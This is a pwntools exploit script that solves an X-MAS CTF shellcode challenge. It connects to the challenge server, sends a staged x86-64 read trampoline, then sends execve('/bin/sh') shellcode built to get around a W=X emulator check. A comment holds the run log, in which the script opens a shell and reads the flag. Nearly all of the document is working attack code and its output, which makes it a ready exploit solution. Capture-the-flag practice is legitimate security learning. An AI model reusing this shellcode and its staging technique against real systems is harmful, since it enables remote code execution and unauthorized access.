import time
from pwn import *
context.update(arch='amd64', os='linux')

if args.REMOTE:
    p = remote('challs.xmas.htsp.ro', 2001)
else:
    p = process(["python3", "wex.py"])

'''
Initial trampoline to prepare a read somewhere on the stack,
followed by a jump to RSP. (the place we just wrote shellcode to)

W=X will forcefully move RIP to the first address of our write
due to the way sys_read's hook works, but thats.. kinda were
we want to be anyways so W=X really doesn't do anything here.
'''
payload = asm(f'''
        mov EAX, {constants.SYS_read}
        xor RDI, RDI
        mov EDX, 0x1000
        sub RSP, RDX
        mov RSI, RSP
        syscall
        JMP RSP
''')

log.info(f"Payload size: {len(payload)}")
assert len(payload) < 25
p.sendlineafter(b"?", payload.hex().encode())
time.sleep(0.1)

'''
Basic /bin/sh shellcode, but without stack usage. We can't use
shellcraft here, since theirs pushes "/bin///sh" onto the stack,
causing memory writes which will cause the emu to try to execute
"/bin///sh" as if it were an instruction.

By bundling "/bin/sh" in this `read` and using relative offsets,
we can bypass the W=X problem completely. Argv and Envp just
point at the included null bytes s.t. they're empty.
'''
payload = asm(f'''
        mov EAX, {constants.SYS_execve}
        add RSP, 32
        mov RDI, RSP
        sub RSP, 8
        mov RSI, RSP
        mov RDX, RSP
        syscall
''')
payload += b"\x00"*8
payload += b"/bin/sh\0"

p.sendline(payload)
p.interactive()

'''
[+] Opening connection to challs.xmas.htsp.ro on port 2001: Done
[*] Payload size: 23
[*] Switching to interactive mode
 $ ls
flag.txt
main
wex.py
$ cat flag.txt
X-MAS{7c4c67665ca44cd3f651bbb22631a41c}

'''
